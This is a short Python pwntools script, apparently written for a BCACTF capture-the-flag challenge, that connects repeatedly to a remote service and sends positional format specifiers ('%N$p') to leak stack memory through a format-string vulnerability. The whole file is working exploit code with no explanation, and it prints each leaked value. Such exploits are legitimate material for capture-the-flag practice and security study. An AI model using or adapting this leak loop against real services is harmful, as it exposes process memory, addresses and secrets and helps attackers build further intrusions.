import string
from pwn import *
context.update(os="linux", arch="i686")
context.log_level = 50

for i in range(1, 4096):
	p = remote("bin.bcactf.com", 49157)
	p.recvuntil("Let's see it!\n")
	fmt_spec = "%%%i$p" % i
	# print(fmt_spec)
	p.sendline(fmt_spec)
	try:
		p.recvuntil("0x")
	except:
		p.recvuntil("(nil)")
	d = p.recvuntil("\n")
	p.close()
	nac_i = d.find(b"\xe2")
	d = d[:nac_i].decode().strip()
	if not d:
		continue
	d = "0x" + d
	print(d)